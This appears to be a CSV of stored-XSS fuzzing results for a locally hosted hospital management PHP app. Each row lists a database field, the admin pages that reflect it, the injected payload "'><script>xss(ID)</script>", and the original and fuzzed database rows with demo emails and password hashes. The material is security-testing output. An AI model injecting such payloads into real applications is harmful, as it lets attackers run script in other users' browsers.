web app,DB source,reflection sink,id,payload,description
hospital,appointment.appointmentTime,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#",918310,"""'><script>xss(918310)</script>","
            hms.appointment.appointmentTime[0][6]
            original row: [1, 'ENT', 1, 1, 500, '2022-11-10', '12:45 PM', datetime.datetime(2022, 11, 6, 12, 21, 48), 1, 0, datetime.datetime(2022, 11, 6, 12, 23, 35)]
            fuzzed row: [1, 'ENT', 1, 1, 500, '2022-11-10', '""\'><script>xss(918310)</script>', datetime.datetime(2022, 11, 6, 12, 21, 48), 1, 0, datetime.datetime(2022, 11, 6, 12, 23, 35)]
            change: '12:45 PM' => '""'><script>xss(918310)</script>'
            
fuzzed after scan 36 / 41
found as XSS in scan 37 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=4",918375,"""'><script>xss(918375)</script>","
            hms.doctorspecilization.specilization[3][1]
            original row: [4, 'Dermatology', datetime.datetime(2022, 10, 30, 18, 10, 28), None]
            fuzzed row: [4, '""\'><script>xss(918375)</script>', datetime.datetime(2022, 10, 30, 18, 10, 28), None]
            change: 'Dermatology' => '""'><script>xss(918375)</script>'
            
fuzzed after scan 9 / 41
found as XSS in scan 10 / 41"
hospital,doctors.doctorName,"http://localhost/hospital/hms/admin/Manage-doctors.php
http://localhost/hospital/hms/admin/Manage-doctors.php#
http://localhost/hospital/hms/admin/manage-doctors.php
http://localhost/hospital/hms/admin/manage-doctors.php#",919615,"""'><script>xss(919615)</script>","
            hms.doctors.doctorName[1][2]
            original row: [2, 'Endocrinologists', 'Charu Dua', 'X 1212 ABC Apartment Laxmi Nagar New Delhi ', '800', 1231231230, 'charudua12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 4, 1, 6, 41), None]
            fuzzed row: [2, 'Endocrinologists', '""\'><script>xss(919615)</script>', 'X 1212 ABC Apartment Laxmi Nagar New Delhi ', '800', 1231231230, 'charudua12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 4, 1, 6, 41), None]
            change: 'Charu Dua' => '""'><script>xss(919615)</script>'
            
fuzzed after scan 4 / 41
found as XSS in scan 5 / 41"
hospital,tblpatient.PatientGender,"http://localhost/hospital/hms/admin/manage-patient.php
http://localhost/hospital/hms/admin/manage-patient.php#
http://localhost/hospital/hms/admin/view-patient.php?viewid=1",920486,"""'><script>xss(920486)</script>","
            hms.tblpatient.PatientGender[0][5]
            original row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', 'male', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            fuzzed row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', '""\'><script>xss(920486)</script>', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            change: 'male' => '""'><script>xss(920486)</script>'
            
fuzzed after scan 31 / 41
found as XSS in scan 32 / 41"
hospital,doctors.specilization,"http://localhost/hospital/hms/admin/Manage-doctors.php
http://localhost/hospital/hms/admin/Manage-doctors.php#
http://localhost/hospital/hms/admin/manage-doctors.php
http://localhost/hospital/hms/admin/manage-doctors.php#",920553,"""'><script>xss(920553)</script>","
            hms.doctors.specilization[1][1]
            original row: [2, 'Endocrinologists', 'Charu Dua', 'X 1212 ABC Apartment Laxmi Nagar New Delhi ', '800', 1231231230, 'charudua12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 4, 1, 6, 41), None]
            fuzzed row: [2, '""\'><script>xss(920553)</script>', 'Charu Dua', 'X 1212 ABC Apartment Laxmi Nagar New Delhi ', '800', 1231231230, 'charudua12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 4, 1, 6, 41), None]
            change: 'Endocrinologists' => '""'><script>xss(920553)</script>'
            
fuzzed after scan 3 / 41
found as XSS in scan 4 / 41"
hospital,appointment.doctorSpecialization,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#",921434,"""'><script>xss(921434)</script>","
            hms.appointment.doctorSpecialization[1][1]
            original row: [2, 'ENT', 1, 2, 500, '2022-11-17', '7:00 PM', datetime.datetime(2022, 11, 6, 13, 16, 18), 1, 1, None]
            fuzzed row: [2, '""\'><script>xss(921434)</script>', 1, 2, 500, '2022-11-17', '7:00 PM', datetime.datetime(2022, 11, 6, 13, 16, 18), 1, 1, None]
            change: 'ENT' => '""'><script>xss(921434)</script>'
            
fuzzed after scan 34 / 41
found as XSS in scan 35 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",922717,"""'><script>xss(922717)</script>","
            hms.doctorspecilization.specilization[1][1]
            original row: [2, 'Internal Medicine', datetime.datetime(2022, 10, 30, 18, 9, 57), None]
            fuzzed row: [2, '""\'><script>xss(922717)</script>', datetime.datetime(2022, 10, 30, 18, 9, 57), None]
            change: 'Internal Medicine' => '""'><script>xss(922717)</script>'
            
fuzzed after scan 9 / 41
found as XSS in scan 10 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=3",924240,"""'><script>xss(924240)</script>","
            hms.doctorspecilization.specilization[2][1]
            original row: [3, 'Obstetrics and Gynecology', datetime.datetime(2022, 10, 30, 18, 10, 18), None]
            fuzzed row: [3, '""\'><script>xss(924240)</script>', datetime.datetime(2022, 10, 30, 18, 10, 18), None]
            change: 'Obstetrics and Gynecology' => '""'><script>xss(924240)</script>'
            
fuzzed after scan 9 / 41
found as XSS in scan 10 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",926376,"""'><script>xss(926376)</script>","
            hms.userlog.logout[4][5]
            original row: [5, 1, 'johndoe12@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 14), '06-03-2023 01:02:22 PM', 1]
            fuzzed row: [5, 1, 'johndoe12@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 14), '""\'><script>xss(926376)</script>', 1]
            change: '06-03-2023 01:02:22 PM' => '""'><script>xss(926376)</script>'
            
fuzzed after scan 20 / 41
found as XSS in scan 21 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",927998,"""'><script>xss(927998)</script>","
            hms.doctorslog.logout[5][5]
            original row: [25, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 16, 53), '06-11-2022 06:47:07 PM', 1]
            fuzzed row: [25, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 16, 53), '""\'><script>xss(927998)</script>', 1]
            change: '06-11-2022 06:47:07 PM' => '""'><script>xss(927998)</script>'
            
fuzzed after scan 28 / 41
found as XSS in scan 29 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",929128,"""'><script>xss(929128)</script>","
            hms.userlog.logout[1][5]
            original row: [2, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 21, 20), '06-11-2022 05:53:00 PM', 1]
            fuzzed row: [2, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 21, 20), '""\'><script>xss(929128)</script>', 1]
            change: '06-11-2022 05:53:00 PM' => '""'><script>xss(929128)</script>'
            
fuzzed after scan 20 / 41
found as XSS in scan 21 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",929476,"""'><script>xss(929476)</script>","
            hms.doctorslog.logout[8][5]
            original row: [28, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 38, 7), None, 1]
            fuzzed row: [28, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 38, 7), '""\'><script>xss(929476)</script>', 1]
            change: 'None' => '""'><script>xss(929476)</script>'
            
fuzzed after scan 28 / 41
found as XSS in scan 29 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",929557,"""'><script>xss(929557)</script>","
            hms.doctorslog.username[0][2]
            original row: [20, None, 'gfdgdf', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 4, 1, 2, 16), None, 0]
            fuzzed row: [20, None, '""\'><script>xss(929557)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 4, 1, 2, 16), None, 0]
            change: 'gfdgdf' => '""'><script>xss(929557)</script>'
            
fuzzed after scan 27 / 41
found as XSS in scan 28 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",932218,"""'><script>xss(932218)</script>","
            hms.doctorslog.logout[0][5]
            original row: [20, None, 'gfdgdf', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 4, 1, 2, 16), None, 0]
            fuzzed row: [20, None, 'gfdgdf', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 4, 1, 2, 16), '""\'><script>xss(932218)</script>', 0]
            change: 'None' => '""'><script>xss(932218)</script>'
            
fuzzed after scan 28 / 41
found as XSS in scan 29 / 41"
hospital,appointment.appointmentTime,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#",933068,"""'><script>xss(933068)</script>","
            hms.appointment.appointmentTime[1][6]
            original row: [2, 'ENT', 1, 2, 500, '2022-11-17', '7:00 PM', datetime.datetime(2022, 11, 6, 13, 16, 18), 1, 1, None]
            fuzzed row: [2, 'ENT', 1, 2, 500, '2022-11-17', '""\'><script>xss(933068)</script>', datetime.datetime(2022, 11, 6, 13, 16, 18), 1, 1, None]
            change: '7:00 PM' => '""'><script>xss(933068)</script>'
            
fuzzed after scan 36 / 41
found as XSS in scan 37 / 41"
hospital,users.gender,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",933658,"""'><script>xss(933658)</script>","
            hms.users.gender[1][4]
            original row: [2, 'Amit kumar', 'new Delhi india', 'New Delhi', 'male', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            fuzzed row: [2, 'Amit kumar', 'new Delhi india', 'New Delhi', '""\'><script>xss(933658)</script>', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            change: 'male' => '""'><script>xss(933658)</script>'
            
fuzzed after scan 24 / 41
found as XSS in scan 25 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=7",935853,"""'><script>xss(935853)</script>","
            hms.doctorspecilization.specilization[6][1]
            original row: [7, 'General Surgery', datetime.datetime(2022, 10, 30, 18, 10, 56), None]
            fuzzed row: [7, '""\'><script>xss(935853)</script>', datetime.datetime(2022, 10, 30, 18, 10, 56), None]
            change: 'General Surgery' => '""'><script>xss(935853)</script>'
            
fuzzed after scan 9 / 41
found as XSS in scan 10 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#",936117,"""'><script>xss(936117)</script>","
            hms.doctorspecilization.specilization[13][1]
            original row: [14, 'Endocrinologists', datetime.datetime(2022, 10, 30, 18, 12, 10), None]
            fuzzed row: [14, '""\'><script>xss(936117)</script>', datetime.datetime(2022, 10, 30, 18, 12, 10), None]
            change: 'Endocrinologists' => '""'><script>xss(936117)</script>'
            
fuzzed after scan 9 / 41
found as XSS in scan 10 / 41"
hospital,users.city,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",937079,"""'><script>xss(937079)</script>","
            hms.users.city[0][3]
            original row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            fuzzed row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', '""\'><script>xss(937079)</script>', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            change: 'Ghaziabad' => '""'><script>xss(937079)</script>'
            
fuzzed after scan 23 / 41
found as XSS in scan 24 / 41"
hospital,tblcontactus.fullname,"http://localhost/hospital/hms/admin/query-details.php?id=2
http://localhost/hospital/hms/admin/read-query.php
http://localhost/hospital/hms/admin/read-query.php#",938587,"""'><script>xss(938587)</script>","
            hms.tblcontactus.fullname[1][1]
            original row: [2, 'Anuj kumar', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            fuzzed row: [2, '""\'><script>xss(938587)</script>', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            change: 'Anuj kumar' => '""'><script>xss(938587)</script>'
            
fuzzed after scan 10 / 41
found as XSS in scan 11 / 41"
hospital,tblcontactus.email,"http://localhost/hospital/hms/admin/query-details.php?id=2
http://localhost/hospital/hms/admin/read-query.php
http://localhost/hospital/hms/admin/read-query.php#",940560,"""'><script>xss(940560)</script>","
            hms.tblcontactus.email[1][2]
            original row: [2, 'Anuj kumar', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            fuzzed row: [2, 'Anuj kumar', '""\'><script>xss(940560)</script>', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            change: 'ak@gmail.com' => '""'><script>xss(940560)</script>'
            
fuzzed after scan 11 / 41
found as XSS in scan 12 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",940796,"""'><script>xss(940796)</script>","
            hms.doctorslog.logout[7][5]
            original row: [27, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 40), '06-03-2023 01:02:48 PM', 1]
            fuzzed row: [27, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 40), '""\'><script>xss(940796)</script>', 1]
            change: '06-03-2023 01:02:48 PM' => '""'><script>xss(940796)</script>'
            
fuzzed after scan 28 / 41
found as XSS in scan 29 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",940897,"""'><script>xss(940897)</script>","
            hms.userlog.logout[2][5]
            original row: [3, None, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 43), None, 0]
            fuzzed row: [3, None, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 43), '""\'><script>xss(940897)</script>', 0]
            change: 'None' => '""'><script>xss(940897)</script>'
            
fuzzed after scan 20 / 41
found as XSS in scan 21 / 41"
hospital,tblcontactus.fullname,"http://localhost/hospital/hms/admin/query-details.php?id=1
http://localhost/hospital/hms/admin/unread-queries.php
http://localhost/hospital/hms/admin/unread-queries.php#",941143,"""'><script>xss(941143)</script>","
            hms.tblcontactus.fullname[0][1]
            original row: [1, 'Anuj kumar', 'anujk30@test.com', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), None, None, None]
            fuzzed row: [1, '""\'><script>xss(941143)</script>', 'anujk30@test.com', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), None, None, None]
            change: 'Anuj kumar' => '""'><script>xss(941143)</script>'
            
fuzzed after scan 10 / 41
found as XSS in scan 11 / 41"
hospital,appointment.doctorSpecialization,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#",942951,"""'><script>xss(942951)</script>","
            hms.appointment.doctorSpecialization[0][1]
            original row: [1, 'ENT', 1, 1, 500, '2022-11-10', '12:45 PM', datetime.datetime(2022, 11, 6, 12, 21, 48), 1, 0, datetime.datetime(2022, 11, 6, 12, 23, 35)]
            fuzzed row: [1, '""\'><script>xss(942951)</script>', 1, 1, 500, '2022-11-10', '12:45 PM', datetime.datetime(2022, 11, 6, 12, 21, 48), 1, 0, datetime.datetime(2022, 11, 6, 12, 23, 35)]
            change: 'ENT' => '""'><script>xss(942951)</script>'
            
fuzzed after scan 34 / 41
found as XSS in scan 35 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",944489,"""'><script>xss(944489)</script>","
            hms.doctorslog.username[3][2]
            original row: [23, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 8, 56), '06-11-2022 05:42:53 PM', 1]
            fuzzed row: [23, 2, '""\'><script>xss(944489)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 8, 56), '06-11-2022 05:42:53 PM', 1]
            change: 'charudua12@test.com' => '""'><script>xss(944489)</script>'
            
fuzzed after scan 27 / 41
found as XSS in scan 28 / 41"
